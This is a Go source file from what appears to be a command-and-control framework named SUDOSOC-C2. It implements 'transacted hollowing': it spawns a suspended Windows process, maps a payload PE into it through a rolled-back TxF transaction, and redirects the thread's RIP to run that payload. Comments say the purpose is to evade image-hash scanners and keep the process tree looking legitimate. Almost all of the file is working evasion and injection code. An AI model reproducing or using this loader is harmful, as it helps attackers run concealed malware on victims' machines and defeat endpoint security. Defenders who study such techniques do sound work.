package doppel

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Transacted Hollowing — Process Hollowing via TxF (Hasherezade, 2018).

	Transacted Hollowing combines classic Process Hollowing with TxF to
	defeat image-hash–based scanners:

	Classic hollowing weakness:
	  Scanners read the image from disk and compare its hash to the loaded
	  image in memory. If they differ → alert. Transacted hollowing defeats
	  this by making the on-disk file appear clean AFTER the image is mapped.

	Technique:
	  1.  Create host process in SUSPENDED state (legitimate binary e.g. svchost.exe)
	  2.  NtCreateTransaction → begin TxF transaction
	  3.  CreateFileTransacted → open the host's executable within transaction
	  4.  NtWriteFile → overwrite transacted file with our payload PE
	  5.  NtCreateSection(SEC_IMAGE) → create image section from transacted file
	  6.  NtUnmapViewOfSection → unmap the original image from the host process
	  7.  NtMapViewOfSection → map our payload section into the host process
	  8.  NtRollbackTransaction → disk file reverts to original (clean)
	  9.  Fix the entry point: patch the suspended thread's context RIP/EIP
	      to point to our payload's entry point.
	  10. NtResumeThread → process executes our payload

	Key advantage over Doppelgänging:
	  - The parent process IS a legitimate Windows process (svchost, explorer, etc.)
	  - The process tree looks normal
	  - The token/environment comes from a real suspended process spawn

	Key advantage over classic hollowing:
	  - The image on disk is clean at time of any scan (transaction rolled back)
	  - Memory-to-disk hash comparison fails (different hashes at different times)
*/

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// HollowResult describes a successfully hollowed process.
type HollowResult struct {
	ProcessHandle windows.Handle
	ThreadHandle  windows.Handle
	PID           uint32
	TID           uint32
	ImageBase     uint64
	EntryPoint    uint64
	OrigImageBase uint64 // the original host image base (now unmapped)
}

var (
	procNtUnmapViewOfSection = modNtdllDoppel.NewProc("NtUnmapViewOfSection")
	procNtMapViewOfSection   = modNtdllDoppel.NewProc("NtMapViewOfSection")
	procNtGetContextThread   = modNtdllDoppel.NewProc("NtGetContextThread")
	procNtSetContextThread   = modNtdllDoppel.NewProc("NtSetContextThread")
	procNtSuspendThread      = modNtdllDoppel.NewProc("NtSuspendThread")
)

// Section view inherit.
const (
	viewUnmap       = 2
	viewShare       = 0
	viewShare64     = 0
	mapInheritNone  = 2
)

// TransactedHollow creates a suspended process from hostPath, maps payload
// into it via a transacted section, and starts execution.
func TransactedHollow(hostPath string, payload []byte, cmdLine string) (*HollowResult, error) {
	// Step 1: Spawn host process in suspended state.
	hostPathPtr, _ := windows.UTF16PtrFromString(hostPath)
	var cmdLineW *uint16
	if cmdLine != "" {
		cmdLineW, _ = windows.UTF16PtrFromString(cmdLine)
	}

	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	var pi windows.ProcessInformation

	if err := windows.CreateProcess(
		hostPathPtr, cmdLineW, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, &pi,
	); err != nil {
		return nil, fmt.Errorf("CreateProcess(%s): %w", hostPath, err)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel/hollow] suspended process created: PID=%d", pi.ProcessId)
	// {{end}}

	// On any subsequent error, terminate the zombie process.
	cleanup := func() {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}

	// Step 2–5: Build transacted section from payload.
	section, tx, err := createTransactedSection(hostPath, payload)
	if err != nil {
		cleanup()
		return nil, fmt.Errorf("transacted section: %w", err)
	}
	defer windows.CloseHandle(section)
	// tx is already rolled back inside createTransactedSection.

	// Step 6: Unmap the original host image.
	origBase, err := getProcessImageBase(pi.Process)
	if err != nil {
		cleanup()
		return nil, fmt.Errorf("get host image base: %w", err)
	}
	r, _, _ := procNtUnmapViewOfSection.Call(
		uintptr(pi.Process),
		uintptr(origBase),
	)
	if r != 0 {
		// Some hosts (PPL, protected) cannot be unmapped — non-fatal, try to proceed.
		// {{if .Config.Debug}}
		log.Printf("[doppel/hollow] NtUnmapViewOfSection NTSTATUS=0x%x (continuing)", r)
		// {{end}}
	}

	// Step 7: Map our payload section into the host process.
	payloadBase, payloadSize, err := mapSectionIntoProcess(pi.Process, section, origBase)
	if err != nil {
		cleanup()
		return nil, fmt.Errorf("map section: %w", err)
	}
	_ = tx // already consumed

	// Step 8: Calculate entry point in the mapped payload.
	entryRVA, err := getPEEntryRVA(payload)
	if err != nil {
		cleanup()
		return nil, fmt.Errorf("entry RVA: %w", err)
	}
	entryPoint := payloadBase + uint64(entryRVA)

	// Step 9: Patch the thread context to point RIP at our entry point.
	if err := patchThreadContext(pi.Thread, entryPoint); err != nil {
		cleanup()
		return nil, fmt.Errorf("patch thread context: %w", err)
	}

	// Step 10: Resume the thread.
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		cleanup()
		return nil, fmt.Errorf("ResumeThread: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[doppel/hollow] process hollowed: PID=%d entry=0x%x base=0x%x size=0x%x",
		pi.ProcessId, entryPoint, payloadBase, payloadSize)
	// {{end}}

	return &HollowResult{
		ProcessHandle: pi.Process,
		ThreadHandle:  pi.Thread,
		PID:           pi.ProcessId,
		TID:           pi.ThreadId,
		ImageBase:     payloadBase,
		EntryPoint:    entryPoint,
		OrigImageBase: origBase,
	}, nil
}

// createTransactedSection writes payload to a transacted copy of filePath,
// creates an image section from it, then rolls back the transaction.
// Returns the section handle and a nil error on success.
func createTransactedSection(filePath string, payload []byte) (windows.Handle, *Transaction, error) {
	tx, err := CreateTxFTransaction()
	if err != nil {
		return 0, nil, err
	}

	fileHandle, err := tx.OpenTransacted(filePath)
	if err != nil {
		tx.Rollback()
		return 0, nil, err
	}

	if err := WriteTransacted(fileHandle, payload); err != nil {
		windows.CloseHandle(fileHandle)
		tx.Rollback()
		return 0, nil, err
	}

	var sectionHandle windows.Handle
	var maxSize int64 = 0
	r, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		uintptr(sectionAllAccess),
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(windows.PAGE_READONLY),
		uintptr(secImage),
		uintptr(fileHandle),
	)
	windows.CloseHandle(fileHandle)

	if r != 0 {
		tx.Rollback()
		return 0, nil, fmt.Errorf("NtCreateSection NTSTATUS=0x%x", r)
	}

	// Roll back NOW — on-disk file reverts while section stays valid.
	tx.Rollback()

	// {{if .Config.Debug}}
	log.Printf("[doppel/hollow] transacted section created and transaction rolled back")
	// {{end}}
	return sectionHandle, tx, nil
}

// mapSectionIntoProcess maps a section into a remote process at preferredBase.
func mapSectionIntoProcess(process windows.Handle, section windows.Handle, preferredBase uint64) (uint64, uint64, error) {
	var base uintptr = uintptr(preferredBase)
	var viewSize uintptr

	r, _, _ := procNtMapViewOfSection.Call(
		uintptr(section),
		uintptr(process),
		uintptr(unsafe.Pointer(&base)),
		0, // ZeroBits
		0, // CommitSize
		0, // SectionOffset
		uintptr(unsafe.Pointer(&viewSize)),
		uintptr(mapInheritNone),
		0, // AllocationType
		uintptr(windows.PAGE_EXECUTE_WRITECOPY),
	)
	// STATUS_IMAGE_NOT_AT_BASE (0x40000003) is acceptable — ASLR moved it.
	if r != 0 && r != 0x40000003 {
		return 0, 0, fmt.Errorf("NtMapViewOfSection NTSTATUS=0x%x", r)
	}
	return uint64(base), uint64(viewSize), nil
}

// patchThreadContext updates a suspended thread's RIP to newRIP.
func patchThreadContext(thread windows.Handle, newRIP uint64) error {
	var ctx CONTEXT_x64
	ctx.ContextFlags = 0x10000B // CONTEXT_FULL on x64
	r, _, _ := procNtGetContextThread.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if r != 0 {
		return fmt.Errorf("NtGetContextThread NTSTATUS=0x%x", r)
	}
	ctx.Rip = newRIP
	r, _, _ = procNtSetContextThread.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if r != 0 {
		return fmt.Errorf("NtSetContextThread NTSTATUS=0x%x", r)
	}
	return nil
}

// CONTEXT_x64 is the minimal layout we need (just the RIP field).
// Full CONTEXT is 1232 bytes with XSAVE area; we declare enough.
type CONTEXT_x64 struct {
	P1Home        uint64
	P2Home        uint64
	P3Home        uint64
	P4Home        uint64
	P5Home        uint64
	P6Home        uint64
	ContextFlags  uint32
	MxCsr         uint32
	SegCs         uint16
	SegDs         uint16
	SegEs         uint16
	SegFs         uint16
	SegGs         uint16
	SegSs         uint16
	EFlags        uint32
	Dr0           uint64
	Dr1           uint64
	Dr2           uint64
	Dr3           uint64
	Dr6           uint64
	Dr7           uint64
	Rax           uint64
	Rcx           uint64
	Rdx           uint64
	Rbx           uint64
	Rsp           uint64
	Rbp           uint64
	Rsi           uint64
	Rdi           uint64
	R8            uint64
	R9            uint64
	R10           uint64
	R11           uint64
	R12           uint64
	R13           uint64
	R14           uint64
	R15           uint64
	Rip           uint64
	// XSAVE area follows — declared as opaque to avoid alignment issues
	_xsave [0x500]byte
}

// getProcessImageBase reads the image base from the remote process PEB.
func getProcessImageBase(process windows.Handle) (uint64, error) {
	var pbi processBasicInfo
	var returnLen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(process),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLen)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess NTSTATUS=0x%x", r)
	}
	var baseBytes [8]byte
	var read uintptr
	procNtReadVirtualMemory.Call(
		uintptr(process),
		pbi.PebBaseAddress+pebImageBaseOffset,
		uintptr(unsafe.Pointer(&baseBytes[0])),
		8,
		uintptr(unsafe.Pointer(&read)),
	)
	return binary.LittleEndian.Uint64(baseBytes[:]), nil
}

// getPEEntryRVA parses a PE binary and returns its AddressOfEntryPoint.
func getPEEntryRVA(payload []byte) (uint32, error) {
	f, err := pe.NewFile(io.ReaderAt(doppelByteReader(payload)))
	if err != nil {
		return 0, err
	}
	defer f.Close()
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("not a 64-bit PE")
	}
	return oh.AddressOfEntryPoint, nil
}
